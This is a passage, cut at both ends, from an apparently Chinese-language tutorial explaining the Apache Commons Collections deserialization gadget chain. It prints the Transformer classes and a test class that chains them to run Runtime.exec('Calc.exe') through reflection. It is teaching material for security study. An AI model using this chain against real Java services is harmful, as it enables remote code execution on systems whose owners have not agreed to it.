class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ChainedTransformer&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Transformer&lt;/span&gt;, Serializable &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;serialVersionUID&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3514945074733160196L&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Transformer[] iTransformers;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;ChainedTransformer&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Transformer[] transformers)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.iTransformers = transformers;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; Object &lt;span class=&#34;title function_&#34;&gt;transform&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Object object)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.iTransformers.length; ++i) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            object = &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.iTransformers[i].transform(object);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; object;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;3.ConstantTransformer&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这个类的作用就是保存一个对象而已，创建实例时需要传入一个需要保存的对象，调用实例的 transform 即可获得其中的对象&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ConstantTransformer&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Transformer&lt;/span&gt;, Serializable &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;serialVersionUID&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;6374440726369055124L&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;Transformer&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;NULL_INSTANCE&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ConstantTransformer&lt;/span&gt;((Object)&lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Object iConstant;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;ConstantTransformer&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Object constantToReturn)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.iConstant = constantToReturn;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//核心代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; Object &lt;span class=&#34;title function_&#34;&gt;transform&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Object input)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.iConstant;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; Object &lt;span class=&#34;title function_&#34;&gt;getConstant&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.iConstant;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;到这里，三个 Transformer 其实就可以连接起来了，先创建一个 Transformer 数组，用 ConstantTransformer 起手，传入一个对象，用 InvokeTransformer 一步一步调用函数，再将数组传入 ChainedTransformer，调用其 transform 函数。&lt;/p&gt;
&lt;p&gt;测试代码&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; org.apache.commons.collections.Transformer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; org.apache.commons.collections.functors.ChainedTransformer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; org.apache.commons.collections.functors.ConstantTransformer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; org.apache.commons.collections.functors.InvokerTransformer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * ChainedTransformer遍历触发&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   等同于 ((Runtime)Runtime.class.getMethod(&amp;quot;getRuntime&amp;quot;,null).invoke(null,null)).exec(&amp;quot;calc.exe&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;TransTest2&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String[] args)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Transformer[] transformers = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Transformer&lt;/span&gt;[]&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;// 获得Runtime类对象&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ConstantTransformer&lt;/span&gt;(Runtime.class),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;// 传入Runtime类对象 反射执行getMethod获得getRuntime方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;InvokerTransformer&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;string&#34;&gt;&amp;quot;getMethod&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Class&lt;/span&gt;[]&amp;#123;String.class,Class[].class&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Object&lt;/span&gt;[]&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;getRuntime&amp;quot;&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Class&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                ),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;// 传入getRuntime方法 反射执行invoke方法 得到Runtime实例&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;InvokerTransformer&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;invoke&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Class&lt;/span&gt;[] &amp;#123;Object.class, Object[].class &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Object&lt;/span&gt;[] &amp;#123;&lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                ),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;// 传入Runtime实例 执行exec方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;InvokerTransformer&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Class&lt;/span&gt;[] &amp;#123;String.class &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Object&lt;/span&gt;[] &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;Calc.exe&amp;quot;&lt;/span&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// ChainedTransformer&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;ChainedTransformer&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;chainedTransformer&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ChainedTransformer&lt;/span&gt;(transformers);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        chainedTransformer.transform(&lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;4.TransformedMap&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;TransformedMap 这个类中封装了一个 decorate 方法，它是用来修饰 Java 中的标准数据结构 Map，当向被修饰过的 Map 中添加新元素时，它就会执行一个回调函数；这个回调并不是传统意义上的回调函数，而是相当于执行一个对象里面的 transform 方法，前提是这个对象的类要实现了 Transformer 接口。&lt;/p&gt;
&lt;p&gt;key 和 value 都是 transform 的子类，keyTransformer 是处理新元素的 Key 的回调，valueTransformer 是处理新元素的 value 的回调，当我们向 outerMap 中添加新元素时，它就会调用 keyTransformer 或者 valueTransformer 里面的 transform 方法。&lt;/p&gt;
&lt;p&gt;checkSetValue 自动执行 value 中的 transform 子类对象&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;TransformedMap&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;AbstractInputCheckedMapDecorator&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Serializable&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;serialVersionUID&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;7023152376788900464L&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Transformer keyTransformer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Transformer valueTransformer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; Map &lt;span class=&#34;title function_&#34;&gt;decorate&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Map map, Transformer keyTransformer, Transformer valueTransformer)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;TransformedMap&lt;/span&gt;(map, keyTransformer, valueTransformer);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;TransformedMap&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Map map, Transformer keyTransformer, Transformer valueTransformer)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;super&lt;/span&gt;(map);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.keyTransformer = keyTransformer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.valueTransformer = valueTransformer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; Object &lt;span class=&#34;title function_&#34;&gt;checkSetValue&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Object value)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.valueTransformer.transform(value);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;5.AbstractInputCheckedMapDecorator&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过 setValue 调用 checkSetValue&lt;/p&gt;
